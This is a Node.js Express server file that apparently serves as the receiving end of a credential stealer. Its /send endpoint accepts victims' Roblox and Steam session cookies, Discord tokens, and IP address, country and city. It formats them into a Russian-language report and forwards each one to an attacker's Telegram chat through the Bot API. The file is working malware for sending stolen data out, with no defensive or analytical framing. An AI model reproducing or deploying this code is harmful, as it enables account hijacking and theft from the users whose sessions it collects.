const express = require('express');
const axios = require('axios');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json({ limit: '10mb' }));

const TOKEN = process.env.TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const API = "https://api.telegram.org/bot" + TOKEN;

app.post('/send', async (req, res) => {
    try {
        const { robloxCookie, steamCookie, discordToken, ip, country, city } = req.body;

        let msg = "🔴 <b>⚠️ ОТЧЁТ</b>\n\n";
        msg += "━━━━━━━━━━━━━━━━━━\n\n";
        msg += "🌐 <b>IP:</b> <code>" + (ip || "Н/Д") + "</code>\n";
        msg += "📍 <b>Страна:</b> <code>" + (country || "Н/Д") + "</code>\n";
        msg += "🏙 <b>Город:</b> <code>" + (city || "Н/Д") + "</code>\n\n";
        msg += "━━━━━━━━━━━━━━━━━━\n\n";

        msg += "🍪 <b>ROBLOX COOKIE:</b>\n";
        msg += robloxCookie ? "<code>" + robloxCookie + "</code>\n\n" : "✅ Уже отправлен\n\n";

        msg += "🎮 <b>STEAM COOKIE:</b>\n";
        msg += steamCookie ? "<code>" + steamCookie + "</code>\n\n" : "✅ Уже отправлен\n\n";

        msg += "💬 <b>DISCORD TOKEN:</b>\n";
        msg += discordToken ? "<code>" + discordToken + "</code>\n\n" : "✅ Уже отправлен\n\n";

        msg += "━━━━━━━━━━━━━━━━━━\n";
        msg += "⏰ <b>Время:</b> " + new Date().toLocaleString("ru-RU");

        await axios.post(API + "/sendMessage", {
            chat_id: CHAT_ID,
            text: msg,
            parse_mode: "HTML",
            disable_web_page_preview: true
        });

        res.json({ ok: true });
    } catch (e) {
        res.status(500).json({ ok: false, error: e.message });
    }
});

app.listen(process.env.PORT || 3000);
